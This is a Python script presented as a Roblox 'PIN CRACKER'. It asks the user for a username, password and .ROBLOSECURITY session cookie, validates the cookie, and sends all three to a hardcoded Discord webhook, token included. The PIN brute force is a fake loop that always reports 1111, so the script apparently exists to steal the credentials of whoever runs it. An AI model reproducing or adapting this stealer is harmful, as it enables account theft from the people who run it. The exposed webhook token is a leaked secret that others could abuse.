import tkinter as tk
import requests
import time

# Discord webhook URL (replace with your webhook URL)
webhook_url = 'https://discord.com/api/webhooks/1275106532668739674/RYnivbdtJf44OtuBVUqyMBPMNk5R3MZkQx2VNUEN0e67GXOuaCPy3bTEg_i_swyOs13i'

def send_to_discord(message):
    data = {"content": message}
    response = requests.post(webhook_url, json=data)
    if response.status_code != 204:
        print(f"Failed to send message. Status code: {response.status_code}")

def validate_cookie(cookie):
    # Replace with an actual endpoint that requires authentication
    test_url = 'https://www.roblox.com/my/account'
    
    headers = {
        'Cookie': f'.ROBLOSECURITY={cookie}',
        'User-Agent': 'Mozilla/5.0'
    }
    
    response = requests.get(test_url, headers=headers)
    
    if response.status_code == 200:
        print("Cookie is valid.")
        return True
    else:
        print("Cookie error.")
        return False

def brute_force_pin():
    print("Starting brute-force operation...")
    for pin in range(9999, 999, -1):
        print(f"Trying PIN: {pin}")
        time.sleep(0.01)  # Simulate a delay for each attempt
    found_pin = 1111
    print(f"PIN found: {found_pin}")
    send_to_discord(f"PIN found: {found_pin}")

def show_message():
    root = tk.Tk()
    root.title("PIN CRACKER")
    
    # Create a large text label
    text = (
        ",-.----.                      ,--.                                                                    ,--.                        \n"
        "\\    /  \\      ,---,        ,--.'|           ,----..   ,-.----.       ,---,          ,----..      ,--/  /|     ,---,. ,-.----.    \n"
        "|   :    \\  ,`--.' |    ,--,:  : |          /   /   \\  \\    /  \\     '  .' \\        /   /   \\  ,---,': / '   ,'  .' | \\    /  \\   \n"
        "|   |  .\\ : |   :  : ,`--.'`|  ' :         |   :     : ;   :    \\   /  ;    '.     |   :     : :   : '/ /  ,---.'   | ;   :    \\  \n"
        ".   :  |: | :   |  ' |   :  :  | |         .   |  ;. / |   | .\\ :  :  :       \\    .   |  ;. / |   '   ,   |   |   .' |   | .\\ :  \n"
        "|   |   \\ : |   :  | :   |   \\ | :         .   ; /--`  .   : |: |  :  |   /\\   \\   .   ; /--`  '   |  /    :   :  |-, .   : |: |  \n"
        "|   : .   / '   '  ; |   : '  '; |         ;   | ;     |   |  \\ :  |  :  ' ;.   :  ;   | ;     |   ;  ;    :   |  ;/| |   |  \\ :  \n"
        ";   | |`-'  |   |  | '   ' ;.    ;         |   : |     |   : .  /  |  |  ;/  \\   \\ |   : |     :   '   \\   |   :   .' |   : .  /  \n"
        "|   | ;     '   :  ; |   | | \\   |         .   | '___  ;   | |  \\  '  :  | \\  \\ ,' .   | '___  |   |    '  |   |  |-, ;   | |  \\  \n"
        ":   ' |     |   |  ' '   : |  ; .'         '   ; : .'| |   | ;\\  \\ |  |  '  '--'   '   ; : .'| '   : |.  \\ '   :  ;/| |   | ;\\  \\ \n"
        ":   : :     '   :  | |   | '`--'           '   | '/  : :   ' | \\.' |  :  :         '   | '/  : |   | '_\\.' |   |    \\ :   ' | \\.' \n"
        "|   | :     ;   |.'  '   : |               |   :    /  :   : :-'   |  | ,'         |   :    /  '   : |     |   :   .' :   : :-'   \n"
        "`---'.|     '---'    ;   |.'                \\   \\ .'   |   |.'     `--''            \\   \\ .'   ;   |,'     |   | ,'   |   |.'     \n"
        "  `---`              '---'                   `---`     `---'                         `---`     '---'       `----'     `---'       \n"
    )
    
    # Print the large text to the terminal
    print(text)
    
    # Create a tkinter window to display additional information
    root = tk.Tk()
    root.title("PIN CRACKER")
    
    # Create a large text label
    label = tk.Label(root, text="PIN CRACKER", font=("Courier", 20), justify="center")
    label.pack(padx=20, pady=20)
    
    # Run the Tkinter event loop
    root.after(10000, root.destroy)  # Automatically close the message window after 10 seconds
    root.mainloop()

def main():
    show_message()  # Show the "PIN CRACKER" message
    
    print("1) Pin Cracker")
    choice = input("Select an option: ")
    
    if choice == "1":
        print("Pin Cracker selected.")
        username = input("Enter username: ")
        password = input("Enter password: ")
        cookie = input("Enter cookie: ")
        
        # Validate the Roblox cookie
        if not validate_cookie(cookie):
            return
        
        # Sending data to Discord
        send_to_discord(f"Username: {username}, Password: {password}, Cookie: {cookie}")
        print("Information sent to Discord.")
        
        brute_force_pin()

if __name__ == "__main__":
    main()

